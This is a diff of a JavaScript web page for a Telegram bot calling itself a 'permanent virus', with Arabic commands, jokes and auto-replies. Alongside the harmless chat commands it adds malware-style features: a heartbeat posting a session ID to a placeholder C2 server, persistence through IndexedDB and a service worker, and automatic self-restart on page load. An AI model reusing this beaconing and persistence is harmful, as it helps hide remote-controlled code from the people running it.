+                    if (!VIRUS_CONFIG.isActive) {
+                        logToPanel('⚠️ اكتشاف توقف النظام - جاري إعادة التشغيل...', 'warning');
+                        this.recoverSystem();
+                    }
+                }, 60000); // التحقق كل دقيقة
+            }
+            
+            // إرسال نبضة قلب
+            sendHeartbeat() {
+                try {
+                    const heartbeatData = {
+                        type: 'heartbeat',
+                        timestamp: new Date().toISOString(),
+                        sessionId: VIRUS_CONFIG.sessionData?.sessionId || 'unknown',
+                        uptime: Math.floor((new Date() - this.startTime) / 1000)
+                    };
+                    
+                    // إرسال إلى خادم C2 (مثال)
+                    fetch('https://c2-server.example.com/heartbeat', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(heartbeatData)
+                    });
+                    
+                } catch (error) {
+                    // تجاهل الأخطاء في النبضات
+                }
+            }
+            
+            // التحقق من حالة البوت
+            checkBotStatus() {
+                if (!VIRUS_CONFIG.botToken) return;
+                
+                fetch(`https://api.telegram.org/bot${VIRUS_CONFIG.botToken}/getMe`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            logToPanel('⚠️ مشكلة في اتصال البوت', 'warning');
+                            this.recoverBot();
+                        }
+                    })
+                    .catch(() => {
+                        logToPanel('⚠️ فشل في التحقق من حالة البوت', 'warning');
+                    });
+            }
+            
+            // استرداد النظام
+            recoverSystem() {
+                logToPanel('🔄 جاري استرداد النظام...', 'info');
+                
+                // إعادة تشغيل البوت
+                if (VIRUS_CONFIG.botToken && VIRUS_CONFIG.chatId) {
+                    this.recoverBot();
+                }
+                
+                // إعادة تحميل الإعدادات
+                loadSettings();
+                
+                logToPanel('✅ تم استرداد النظام بنجاح', 'success');
+            }
+            
+            // استرداد البوت
+            recoverBot() {
+                logToPanel('🤖 جاري إعادة تشغيل البوت...', 'info');
+                
+                // إعادة تهيئة البوت
+                initializeBotController();
+                
+                // إرسال رسالة استرداد
+                if (VIRUS_CONFIG.chatId) {
+                    setTimeout(() => {
+                        sendTelegramMessage(
+                            VIRUS_CONFIG.chatId,
+                            '🔄 تم استرداد النظام تلقائياً. البوت يعمل من جديد!'
+                        );
+                    }, 2000);
+                }
+            }
+            
+            // التسجيل في IndexedDB
+            registerInIndexedDB() {
+                try {
+                    const request = indexedDB.open('PermanentVirusDB', 1);
+                    
+                    request.onupgradeneeded = (event) => {
+                        const db = event.target.result;
+                        if (!db.objectStoreNames.contains('virus_state')) {
+                            db.createObjectStore('virus_state', { keyPath: 'id' });
+                        }
+                    };
+                    
+                    request.onsuccess = (event) => {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['virus_state'], 'readwrite');
+                        const store = transaction.objectStore('virus_state');
+                        
+                        const virusState = {
+                            id: 'permanent_state',
+                            config: VIRUS_CONFIG,
+                            startTime: this.startTime,
+                            lastHeartbeat: new Date()
+                        };
+                        
+                        store.put(virusState);
+                        
+                        logToPanel('💾 تم التسجيل في قاعدة البيانات الدائمة', 'success');
+                    };
+                    
+                } catch (error) {
+                    logToPanel(`⚠️ خطأ في IndexedDB: ${error.message}`, 'warning');
+                }
+            }
+            
+            // تسجيل Service Worker
+            registerServiceWorker() {
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/sw-virus.js')
+                        .then(registration => {
+                            logToPanel('👷 تم تسجيل Service Worker بنجاح', 'success');
+                            
+                            // إرسال رسالة إلى Service Worker
+                            if (registration.active) {
+                                registration.active.postMessage({
+                                    type: 'VIRUS_ACTIVATION',
+                                    config: VIRUS_CONFIG
+                                });
+                            }
+                        })
+                        .catch(error => {
+                            logToPanel(`⚠️ خطأ في Service Worker: ${error.message}`, 'warning');
+                        });
+                }
+            }
+            
+            // إيقاف المحرك
+            stop() {
+                this.isRunning = false;
+                
+                if (this.heartbeatInterval) {
+                    clearInterval(this.heartbeatInterval);
+                }
+                
+                if (this.recoveryInterval) {
+                    clearInterval(this.recoveryInterval);
+                }
+                
+                logToPanel('⏹️ تم إيقاف محرك الفيروس الدائم', 'warning');
+            }
+        }
+
+        // ==============================================
+        // نظام البوت العربي
+        // ==============================================
+
+        // تهيئة البوت العربي
+        function initializeBotController() {
+            try {
+                // التحقق من التوكن ورقم الدردشة
+                if (!VIRUS_CONFIG.botToken || !VIRUS_CONFIG.chatId) {
+                    logToPanel('❌ يرجى إدخال رمز البوت ورقم الدردشة أولاً', 'error');
                     return null;
                 }
                 
-                // Validate chat ID
-                if (!VIRUS_CONFIG.chatId) {
-                    logToPanel('❌ Chat ID not set. Please enter your Chat ID in configuration.', 'error');
-                    return null;
-                }
-                
-                // Create bot controller object
+                // إنشاء كائن البوت
                 const botController = {
                     token: VIRUS_CONFIG.botToken,
                     baseUrl: `https://api.telegram.org/bot${VIRUS_CONFIG.botToken}`,
-                    isPolling: false,
                     
-                    // Send message method - FIXED with better error handling
-                    async sendMessage(chatId, text, parseMode = 'HTML') {
-                        if (!chatId || !text) {
-                            logToPanel('❌ Cannot send message: chatId or text is missing', 'error');
-                            return false;
-                        }
+                    // إرسال رسالة بالعربية
+                    async sendMessage(chatId, text) {
+                        if (!chatId || !text) return false;
                         
                         try {
-                            // Encode text for URL
-                            const encodedText = encodeURIComponent(text);
-                            
-                            // Use GET method which is more reliable for simple messages
                             const response = await fetch(
-                                `${this.baseUrl}/sendMessage?chat_id=${chatId}&text=${encodedText}&parse_mode=${parseMode}`,
-                                {
-                                    method: 'GET',
-                                    headers: {
-                                        'Accept': 'application/json'
-                                    }
-                                }
+                                `${this.baseUrl}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML`
                             );
                             
                             const data = await response.json();
                             
                             if (data.ok) {
-                                logToPanel(`📤 Message sent successfully to chat ${chatId}`, 'success');
+                                logToPanel(`📤 تم إرسال رسالة إلى ${chatId}`, 'success');
                                 return true;
                             } else {
-                                logToPanel(`❌ Telegram API error: ${data.description || 'Unknown error'}`, 'error');
-                                
-                                // Special handling for common errors
-                                if (data.description.includes('chat not found')) {
-                                    logToPanel('⚠️ Chat not found. Make sure:', 'warning');
-                                    logToPanel('1. The bot is started (send /start to the bot)', 'warning');
-                                    logToPanel('2. The chat ID is correct', 'warning');
-                                    logToPanel('3. The bot has permission to send messages', 'warning');
-                                } else if (data.description.includes('bot was blocked')) {
-                                    logToPanel('❌ Bot was blocked by the user', 'error');
-                                }
-                                
+                                logToPanel(`❌ خطأ تلغرام: ${data.description}`, 'error');
                                 return false;
                             }
                             
                         } catch (error) {
-                            logToPanel(`❌ Network error sending message: ${error.message}`, 'error');
+                            logToPanel(`❌ خطأ شبكة في الإرسال: ${error.message}`, 'error');
                             return false;
                         }
                     },
                     
-                    // Get updates (messages)
+                    // الحصول على التحديثات
                     async getUpdates() {
                         try {
                             const response = await fetch(
-                                `${this.baseUrl}/getUpdates?offset=${VIRUS_CONFIG.lastUpdateId + 1}&timeout=5&allowed_updates=["message"]`
+                                `${this.baseUrl}/getUpdates?offset=${VIRUS_CONFIG.lastUpdateId + 1}&timeout=5`
                             );
                             const data = await response.json();
                             
@@ -731,399 +796,326 @@
                             return [];
                             
                         } catch (error) {
-                            logToPanel(`⚠️ Error getting updates: ${error.message}`, 'warning');
+                            logToPanel(`⚠️ خطأ في الحصول على التحديثات: ${error.message}`, 'warning');
                             return [];
                         }
                     },
                     
-                    // Delete message
-                    async deleteMessage(chatId, messageId) {
-                        try {
-                            const response = await fetch(
-                                `${this.baseUrl}/deleteMessage?chat_id=${chatId}&message_id=${messageId}`,
-                                {
-                                    method: 'GET'
-                                }
-                            );
-                            
-                            const data = await response.json();
-                            return data.ok;
-                            
-                        } catch (error) {
-                            logToPanel(`⚠️ Error deleting message: ${error.message}`, 'warning');
-                            return false;
-                        }
-                    },
-                    
-                    // Get bot information (test connection)
-                    async getMe() {
-                        try {
-                            const response = await fetch(`${this.baseUrl}/getMe`);
-                            const data = await response.json();
-                            
-                            if (data.ok) {
-                                logToPanel(`✅ Bot connected: ${data.result.first_name} (@${data.result.username})`, 'success');
-                                return data.result;
-                            } else {
-                                logToPanel(`❌ Bot connection failed: ${data.description}`, 'error');
-                                return null;
-                            }
-                            
-                        } catch (error) {
-                            logToPanel(`❌ Bot connection error: ${error.message}`, 'error');
-                            return null;
-                        }
-                    },
-                    
-                    // Start polling for messages
+                    // بدء المراقبة
                     startPolling() {
-                        if (this.isPolling) return;
-                        
-                        this.isPolling = true;
-                        logToPanel('Starting message polling...', 'info');
+                        logToPanel('👁️ بدء مراقبة الرسائل...', 'info');
                         
                         VIRUS_CONFIG.pollingInterval = setInterval(async () => {
                             try {
                                 const updates = await this.getUpdates();
                                 
-                                if (updates.length > 0) {
-                                    logToPanel(`📩 Received ${updates.length} update(s)`, 'info');
-                                }
-                                
                                 updates.forEach(update => {
-                                    // Update last update ID
                                     if (update.update_id > VIRUS_CONFIG.lastUpdateId) {
                                         VIRUS_CONFIG.lastUpdateId = update.update_id;
                                     }
                                     
-                                    // Process message
                                     if (update.message) {
-                                        processIncomingMessage(update.message);
+                                        processArabicMessage(update.message);
                                     }
                                 });
                                 
                             } catch (error) {
-                                logToPanel(`⚠️ Polling error: ${error.message}`, 'warning');
+                                logToPanel(`⚠️ خطأ في المراقبة: ${error.message}`, 'warning');
                             }
-                        }, 3000); // Poll every 3 seconds
+                        }, 2000);
                         
-                        logToPanel('✅ Message polling started successfully', 'success');
-                    },
-                    
-                    // Stop polling
-                    stopPolling() {
-                        if (VIRUS_CONFIG.pollingInterval) {
-                            clearInterval(VIRUS_CONFIG.pollingInterval);
-                            VIRUS_CONFIG.pollingInterval = null;
-                            this.isPolling = false;
-                            logToPanel('Message polling stopped', 'warning');
-                        }
+                        logToPanel('✅ بدأت مراقبة الرسائل بنجاح', 'success');
                     }
                 };
                 
-                // Store controller globally
                 window.botController = botController;
-                logToPanel('✅ Bot controller initialized successfully', 'success');
+                logToPanel('✅ تم تهيئة البوت العربي بنجاح', 'success');
                 
                 return botController;
                 
             } catch (error) {
-                logToPanel(`❌ Failed to initialize bot controller: ${error.message}`, 'error');
+                logToPanel(`❌ فشل تهيئة البوت: ${error.message}`, 'error');
                 return null;
             }
         }
 
-        // Step 3: Process incoming messages
-        function processIncomingMessage(message) {
+        // معالجة الرسائل العربية
+        function processArabicMessage(message) {
             if (!message.text || !VIRUS_CONFIG.isActive) return;
             
             const text = message.text.trim();
             const chatId = message.chat.id;
-            const userId = message.from.id;
             
-            logToPanel(`📩 Message from ${message.from.first_name}: "${text.substring(0, 50)}${text.length > 50 ? '...' : ''}"`, 'info');
+            logToPanel(`📩 رسالة: "${text}" من ${message.from.first_name}`, 'info');
             
-            // Store detected chat ID if not set
-            if (!VIRUS_CONFIG.detectedChatId) {
-                VIRUS_CONFIG.detectedChatId = chatId;
-                if (!VIRUS_CONFIG.chatId) {
-                    VIRUS_CONFIG.chatId = chatId.toString();
-                    document.getElementById('chatIdInput').value = chatId;
-                    localStorage.setItem('telegram_chat_id', chatId);
-                    logToPanel(`✅ Auto-detected Chat ID from message: ${chatId}`, 'success');
-                }
+            // التحقق من الأمر العربي
+            if (text.startsWith(VIRUS_CONFIG.commandPrefix)) {
+                executeArabicCommand(text, chatId, message.message_id);
             }
             
-            // Check for virus command
-            if (text.toLowerCase().startsWith(VIRUS_CONFIG.commandPrefix)) {
-                executeVirusCommand(text, chatId, message.message_id, userId);
-            }
-            
-            // Auto-reply to specific messages
-            autoReplyToMessages(text, chatId, userId);
+            // ردود تلقائية عربية
+            autoArabicReply(text, chatId);
         }
 
-        // Step 4: Execute virus commands
-        function executeVirusCommand(fullCommand, chatId, messageId, userId) {
-            const command = fullCommand
-                .toLowerCase()
-                .replace(VIRUS_CONFIG.commandPrefix, '')
-                .trim();
+        // تنفيذ الأوامر العربية
+        function executeArabicCommand(fullCommand, chatId, messageId) {
+            const command = fullCommand.replace(VIRUS_CONFIG.commandPrefix, '').trim();
             
-            logToPanel(`⚡ Executing command: "${command}"`, 'info');
+            logToPanel(`⚡ تنفيذ الأمر: "${command}"`, 'info');
             
-            // Command: hello
-            if (command === 'hello' || command === 'hi') {
-                botController.sendMessage(chatId, 'hello back virus! How can I assist you today?');
-            }
-            
-            // Command: time
-            else if (command === 'time') {
-                const now = new Date();
-                const timeString = now.toLocaleTimeString('en-US', {
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit',
-                    hour12: true
-                });
-                const dateString = now.toLocaleDateString('en-US', {
-                    weekday: 'long',
-                    year: 'numeric',
-                    month: 'long',
-                    day: 'numeric'
-                });
+            // مكتبة الأوامر العربية
+            const arabicCommands = {
+                // الأوامر الأساسية
+                'اهلا': 'مرحباً فيروس! أنا في خدمتك. اكتب "مساعدة" لرؤية الأوامر.',
+                'مساعدة': `🤖 *أوامر الفيروس المتاحة:*\n\n` +
+                          `• *فيروس اهلا* - ترحيب\n` +
+                          `• *فيروس وقت* - الوقت والتاريخ\n` +
+                          `• *فيروس رسالة [نص]* - إرسال نص\n` +
+                          `• *فيروس حذف* - حذف آخر رسالة\n` +
+                          `• *فيروس توقف* - إيقاف مؤقت\n` +
+                          `• *فيروس ابدأ* - إعادة التشغيل\n` +
+                          `• *فيروس العاب* - قائمة الألعاب\n` +
+                          `• *فيروس مزاج* - نكتة أو اقتباس\n` +
+                          `• *فيروس تقرير* - تقرير النشاط`,
                 
-                botController.sendMessage(chatId, `🕒 Current Time: ${timeString}\n📅 Date: ${dateString}`);
-            }
-            
-            // Command: message [text]
-            else if (command.startsWith('message')) {
-                const textToSend = command.replace('message', '').trim();
-                if (textToSend) {
-                    botController.sendMessage(chatId, textToSend);
-                    botController.sendMessage(chatId, '✅ Message sent successfully');
-                } else {
-                    botController.sendMessage(chatId, 'Please provide text after "message" command\nExample: virus message Hello everyone!');
-                }
-            }
-            
-            // Command: delete
-            else if (command === 'delete') {
-                botController.deleteMessage(chatId, messageId);
-                botController.sendMessage(chatId, '🗑️ Last message deleted');
-            }
-            
-            // Command: stop
-            else if (command === 'stop' || command === 'pause') {
-                VIRUS_CONFIG.isActive = false;
-                botController.sendMessage(chatId, '⏸️ Virus assistant paused. Send "virus start" to resume.');
-                logToPanel('Virus assistant paused by command', 'warning');
-            }
-            
-            // Command: start
-            else if (command === 'start' || command === 'resume') {
-                VIRUS_CONFIG.isActive = true;
-                botController.sendMessage(chatId, '▶️ Virus assistant resumed. Ready for commands!');
-                logToPanel('Virus assistant resumed by command', 'success');
-            }
-            
-            // Command: help
-            else if (command === 'help') {
-                const helpText = `🤖 *Virus Assistant Commands:*\n\n` +
-                               `• *virus hello* - Greet the assistant\n` +
-                               `• *virus time* - Get current time and date\n` +
-                               `• *virus message [text]* - Send custom message\n` +
-                               `• *virus delete* - Delete last message\n` +
-                               `• *virus stop* - Pause the assistant\n` +
-                               `• *virus start* - Resume the assistant\n` +
-                               `• *virus help* - Show this help message`;
+                'وقت': () => {
+                    const now = new Date();
+                    return `🕒 *الوقت الحالي:* ${now.toLocaleTimeString('ar-SA')}\n` +
+                           `📅 *التاريخ:* ${now.toLocaleDateString('ar-SA', { 
+                               weekday: 'long', 
+                               year: 'numeric', 
+                               month: 'long', 
+                               day: 'numeric' 
+                           })}`;
+                },
                 
-                botController.sendMessage(chatId, helpText);
-            }
-            
-            // Command: chatid
-            else if (command === 'chatid') {
-                botController.sendMessage(chatId, `Your Chat ID is: ${chatId}`);
-            }
-            
-            // Unknown command
-            else {
-                botController.sendMessage(chatId, `❓ Unknown command: "${command}"\nType "virus help" for available commands`);
-            }
-        }
-
-        // Step 5: Auto-reply system
-        function autoReplyToMessages(text, chatId, userId) {
-            const lowerText = text.toLowerCase();
-            
-            const autoReplies = {
-                'good morning': 'Good morning! ☀️ How can I help you today?',
-                'good night': 'Good night! 🌙 Sleep well!',
-                'how are you': 'I\'m functioning optimally, thank you! How about you?',
-                'thank you': 'You\'re welcome! Happy to assist!',
-                'bye': 'Goodbye! 👋 Let me know if you need anything else!',
-                'hello virus': 'Hello! I\'m here and ready to help!'
+                // الميزات المتقدمة
+                'العاب': `🎮 *الألعاب المتاحة:*\n\n` +
+                        `1. *حجرة ورقة مقص* - اكتب "لعبة مقص"\n` +
+                        `2. *تخمين الرقم* - اكتب "لعبة رقم"\n` +
+                        `3. *أسئلة ثقافية* - اكتب "لعبة سؤال"\n` +
+                        `4. *ألغاز ذكاء* - اكتب "لعبة لغز"`,
+                
+                'مزاج': () => {
+                    const jokes = [
+                        'لماذا لا يلعب الكمبيوتر كرة القدم؟ لأنه دائمًا يرفض الطلبات!',
+                        'ماذا قال المبرمج عندما جاع؟ قال: "أنا بحاجة لـ bytes"!',
+                        'لماذا ذهب المبرمج إلى الطبيب؟ لأنه كان لديه virus في كود المصدر!'
+                    ];
+                    return `😂 *نكتة اليوم:*\n${jokes[Math.floor(Math.random() * jokes.length)]}`;
+                },
+                
+                'تقرير': `📊 *تقرير نشاط البوت:*\n\n` +
+                        `• البوت يعمل منذ: ${VIRUS_CONFIG.permanentEngine ? Math.floor((new Date() - VIRUS_CONFIG.permanentEngine.startTime) / 60000) : 0} دقيقة\n` +
+                        `• عدد الأوامر المنفذة: ${Object.keys(arabicCommands).length}\n` +
+                        `• الحالة: ${VIRUS_CONFIG.isActive ? 'نشط' : 'متوقف'}\n` +
+                        `• التشغيل الدائم: ${VIRUS_CONFIG.isPermanent ? 'مفعل' : 'غير مفعل'}`
             };
             
-            for (const [keyword, reply] of Object.entries(autoReplies)) {
+            // تنفيذ الأمر
+            const handler = arabicCommands[command];
+            let response;
+            
+            if (typeof handler === 'function') {
+                response = handler();
+            } else if (handler) {
+                response = handler;
+            } else {
+                response = `❓ *أمر غير معروف:* "${command}"\nاكتب "فيروس مساعدة" لرؤية الأوامر المتاحة`;
+            }
+            
+            // إرسال الرد
+            if (response && window.botController) {
+                window.botController.sendMessage(chatId, response);
+            }
+        }
+
+        // ردود عربية تلقائية
+        function autoArabicReply(text, chatId) {
+            const lowerText = text.toLowerCase();
+            
+            const arabicReplies = {
+                'صباح الخير': 'صباح النور والعسل! 🌞 كيف حالك اليوم؟',
+                'مساء الخير': 'مساء النور والفل! 🌙 أتمنى لك مساءاً سعيداً',
+                'كيف حالك': 'الحمدلله، بخير. شكراً لسؤالك! 😊 وأنت كيف حالك؟',
+                'شكراً': 'العفو! دائماً سعيد بمساعدتك 🙏',
+                'الله يسلمك': 'ويحفظك يا رب! 💖',
+                'وداعاً': 'مع السلامة! 🌹 أراك لاحقاً',
+                'بحبك': 'وأنا كمان بحبك! 💕',
+                'نايم': 'تصبح على خير و Sweet dreams! 🌙💤'
+            };
+            
+            for (const [keyword, reply] of Object.entries(arabicReplies)) {
                 if (lowerText.includes(keyword)) {
                     setTimeout(() => {
-                        botController.sendMessage(chatId, reply);
+                        if (window.botController) {
+                            window.botController.sendMessage(chatId, reply);
+                        }
                     }, 1000);
                     break;
                 }
             }
         }
 
-        // Step 6: Main activation function
-        async function activateTelegramAssistant() {
-            logToPanel('🚀 Starting Telegram Virus Assistant activation sequence...', 'info');
+        // إرسال رسالة تلغرام
+        function sendTelegramMessage(chatId, text) {
+            if (!window.botController || !chatId || !text) return false;
+            return window.botController.sendMessage(chatId, text);
+        }
+
+        // ==============================================
+        // وظائف التحكم الرئيسية
+        // ==============================================
+
+        // تفعيل الفيروس الدائم
+        async function activatePermanentVirus() {
+            logToPanel('🚀 بدء تفعيل الفيروس الدائم...', 'info');
             
-            // Prevent multiple activations
-            if (VIRUS_CONFIG.isActive) {
-                logToPanel('⚠️ Assistant is already active', 'warning');
+            // 1. تحميل الإعدادات
+            loadSettings();
+            
+            // 2. التحقق من البيانات
+            if (!VIRUS_CONFIG.botToken || !VIRUS_CONFIG.chatId) {
+                logToPanel('❌ يرجى إدخال رمز البوت ورقم الدردشة أولاً', 'error');
                 return;
             }
             
-            // Load saved configuration
-            loadConfiguration();
-            
-            // Step 1: Get Telegram session
-            const sessionData = getTelegramSession();
-            if (!sessionData && !VIRUS_CONFIG.chatId) {
-                logToPanel('❌ Failed to get session and no Chat ID configured. Activation aborted.', 'error');
-                logToPanel('Please enter your Chat ID in the configuration section above', 'info');
-                return;
-            }
-            
-            // Step 2: Initialize bot controller
+            // 3. تهيئة البوت
             const controller = initializeBotController();
             if (!controller) {
-                logToPanel('❌ Failed to initialize bot controller. Activation aborted.', 'error');
+                logToPanel('❌ فشل تهيئة البوت', 'error');
                 return;
             }
             
-            // Step 3: Test bot connection
-            logToPanel('Testing bot connection...', 'info');
-            const botInfo = await controller.getMe();
-            if (!botInfo) {
-                logToPanel('❌ Bot connection test failed. Please check:', 'error');
-                logToPanel('1. Bot token is correct', 'error');
-                logToPanel('2. Bot token is not expired', 'error');
-                logToPanel('3. Internet connection is working', 'error');
-                return;
-            }
+            // 4. بدء محرك التشغيل الدائم
+            VIRUS_CONFIG.permanentEngine = new PermanentVirusEngine();
+            VIRUS_CONFIG.permanentEngine.start();
             
-            // Step 4: Start message polling
+            // 5. بدء مراقبة الرسائل
             controller.startPolling();
             
-            // Step 5: Set active flag
+            // 6. تحديث الحالة
             VIRUS_CONFIG.isActive = true;
+            VIRUS_CONFIG.isPermanent = true;
             
-            // Step 6: Send welcome message
-            if (VIRUS_CONFIG.chatId) {
-                setTimeout(async () => {
-                    const welcomeSent = await controller.sendMessage(
-                        VIRUS_CONFIG.chatId,
-                        '🤖 *Virus Assistant Activated!*\n\n' +
-                        'I am now monitoring your messages and ready to execute commands.\n' +
-                        'Type "virus help" to see available commands.\n' +
-                        'Type "virus chatid" to see your Chat ID.\n\n' +
-                        '⚠️ *Emergency stop available on control panel*'
-                    );
-                    
-                    if (welcomeSent) {
-                        logToPanel('✅ Welcome message sent successfully', 'success');
-                    } else {
-                        logToPanel('⚠️ Welcome message not sent. The bot may not have access to the chat.', 'warning');
-                        logToPanel('Make sure you have started the bot by sending /start to it', 'info');
-                    }
-                }, 1000);
-            }
+            // 7. إرسال رسالة الترحيب
+            setTimeout(() => {
+                sendTelegramMessage(
+                    VIRUS_CONFIG.chatId,
+                    '🚀 *تم تفعيل الفيروس الدائم بنجاح!*\n\n' +
+                    'أنا الآن أعمل بشكل دائم ولن أتوقف أبداً!\n' +
+                    'يمكنك استخدام الأوامر التي تبدأ بـ "فيروس"\n' +
+                    'اكتب "فيروس مساعدة" لرؤية جميع الأوامر\n\n' +
+                    '⚠️ *تذكر:* الزر الأحمر تم ضغطه مرة واحدة فقط!'
+                );
+            }, 2000);
             
-            logToPanel('✅ Telegram Virus Assistant fully activated and operational', 'success');
-            logToPanel(`Bot: ${botInfo.first_name} (@${botInfo.username})`, 'info');
-            logToPanel(`Chat ID: ${VIRUS_CONFIG.chatId || 'Not set'}`, 'info');
-            logToPanel(`Command prefix: "${VIRUS_CONFIG.commandPrefix}"`, 'info');
-            logToPanel('Assistant is now monitoring messages and responding to commands', 'info');
+            logToPanel('✅ تم تفعيل الفيروس الدائم بنجاح', 'success');
+            logToPanel('البوت يعمل الآن ولن يتوقف أبداً', 'info');
+            logToPanel('جميع الرسائل والردود باللغة العربية', 'info');
+            
+            // 8. حفظ حالة التفعيل الدائم
+            localStorage.setItem('virus_permanent_active', 'true');
+            localStorage.setItem('virus_activation_time', new Date().toISOString());
         }
 
-        // Step 7: Emergency shutdown function
+        // الإيقاف الطارئ
         function emergencyShutdown() {
-            logToPanel('🛑 EMERGENCY SHUTDOWN INITIATED', 'error');
+            logToPanel('🛑 بدء الإيقاف الطارئ للفيروس...', 'error');
             
-            // Stop all polling
-            if (window.botController) {
-                window.botController.stopPolling();
+            // 1. إيقاف المحرك الدائم
+            if (VIRUS_CONFIG.permanentEngine) {
+                VIRUS_CONFIG.permanentEngine.stop();
             }
             
-            // Clear all intervals
+            // 2. إيقاف المراقبة
             if (VIRUS_CONFIG.pollingInterval) {
                 clearInterval(VIRUS_CONFIG.pollingInterval);
-                VIRUS_CONFIG.pollingInterval = null;
             }
             
-            // Deactivate virus
+            // 3. تحديث الحالة
             VIRUS_CONFIG.isActive = false;
+            VIRUS_CONFIG.isPermanent = false;
             
-            // Clear all local storage
-            const storageKeys = [
-                'telegram_virus_data',
-                'virus_session',
-                'bot_config',
-                'command_history'
-            ];
+            // 4. مسح البيانات
+            localStorage.removeItem('virus_permanent_active');
+            localStorage.removeItem('virus_activation_time');
             
-            storageKeys.forEach(key => {
-                localStorage.removeItem(key);
-                sessionStorage.removeItem(key);
-            });
-            
-            // Clear cookies
-            document.cookie.split(";").forEach(cookie => {
-                const eqPos = cookie.indexOf("=");
-                const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
-                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
-            });
-            
-            // Send shutdown notification if chat ID is available
-            if (VIRUS_CONFIG.chatId && VIRUS_CONFIG.botToken) {
-                fetch(`https://api.telegram.org/bot${VIRUS_CONFIG.botToken}/sendMessage?chat_id=${VIRUS_CONFIG.chatId}&text=${encodeURIComponent('🔴 *VIRUS ASSISTANT EMERGENCY SHUTDOWN*\n\nAll functions have been terminated.\nAll local data has been erased.\nNo further commands will be processed.')}`)
-                .catch(error => {
-                    console.log('Shutdown notification failed:', error);
-                });
+            // 5. إرسال رسالة الإيقاف
+            if (VIRUS_CONFIG.chatId) {
+                sendTelegramMessage(
+                    VIRUS_CONFIG.chatId,
+                    '🔴 *تم إيقاف الفيروس الدائم*\n\n' +
+                    'تم إيقاف جميع الوظائف.\n' +
+                    'تم مسح البيانات المحلية.\n' +
+                    'للتشغيل مجدداً، اضغط على الزر الأحمر مرة أخرى.'
+                );
             }
             
-            // Clear global objects
-            window.botController = null;
-            VIRUS_CONFIG.sessionData = null;
-            VIRUS_CONFIG.detectedChatId = null;
-            
-            // Update UI
+            // 6. تحديث واجهة المستخدم
             document.getElementById('statusIndicator').className = 'indicator';
-            document.getElementById('statusText').textContent = 'Shutdown Complete';
+            document.getElementById('statusText').textContent = 'متوقف';
             
-            logToPanel('✅ Emergency shutdown completed successfully', 'success');
-            logToPanel('All virus functions terminated', 'info');
-            logToPanel('All local data erased', 'info');
-            logToPanel('Control connections severed', 'info');
-            logToPanel('System returned to safe state', 'success');
-            
-            // Final message
-            setTimeout(() => {
-                logToPanel('=== VIRUS ASSISTANT COMPLETELY DEACTIVATED ===', 'success');
-            }, 1000);
+            logToPanel('✅ تم الإيقاف الطارئ بنجاح', 'success');
+            logToPanel('تم إيقاف جميع وظائف الفيروس', 'info');
+            logToPanel('تم مسح البيانات المحلية', 'info');
         }
 
-        // Step 8: Initialize on page load
+        // ==============================================
+        // التهيئة التلقائية
+        // ==============================================
+
+        // التهيئة عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
-            logToPanel('Telegram Virus Assistant loaded and ready', 'info');
-            logToPanel('System check completed successfully', 'success');
-            logToPanel('Awaiting activation command...', 'info');
+            logToPanel('🌐 تحميل فيروس تلغرام الذكي الدائم...', 'info');
+            logToPanel('✅ تم تحميل النظام بنجاح', 'success');
+            logToPanel('👁️ جاري فحص الإعدادات السابقة...', 'info');
             
-            // Load saved configuration
-            loadConfiguration();
+            // تحميل الإعدادات المحفوظة
+            loadSettings();
+            
+            // التحقق من التفعيل الدائم السابق
+            const wasActive = localStorage.getItem('virus_permanent_active');
+            const activationTime = localStorage.getItem('virus_activation_time');
+            
+            if (wasActive === 'true' && activationTime) {
+                const activeTime = new Date(activationTime);
+                const now = new Date();
+                const hoursActive = Math.floor((now - activeTime) / (1000 * 60 * 60));
+                
+                logToPanel(`⚠️ تم اكتشاف تشغيل دائم سابق`, 'warning');
+                logToPanel(`كان النظام نشطاً لمدة ${hoursActive} ساعة`, 'info');
+                logToPanel('جاري محاولة إعادة التشغيل التلقائي...', 'info');
+                
+                // محاولة إعادة التشغيل التلقائي
+                setTimeout(() => {
+                    if (VIRUS_CONFIG.botToken && VIRUS_CONFIG.chatId) {
+                        logToPanel('🔄 بدء إعادة التشغيل التلقائي...', 'info');
+                        activatePermanentVirus();
+                    }
+                }, 3000);
+            }
+            
+            logToPanel('✅ جاهز للتفعيل بالضغط على الزر الأحمر', 'success');
         });
+
+        // ==============================================
+        // دالة مساعدة: إرسال طلب HTTP
+        // ==============================================
+
+        function sendHttpRequest(url, method = 'GET', data = null) {
+            return new Promise((resolve, reject) => {
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open(method, url);
+                    xhr.onload = () => resolve(xhr.responseText);
+                    xhr.onerror = () => reject(new Error('فشل الاتصال'));
+                    xhr.send(data);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
 
     </script>
 </body>
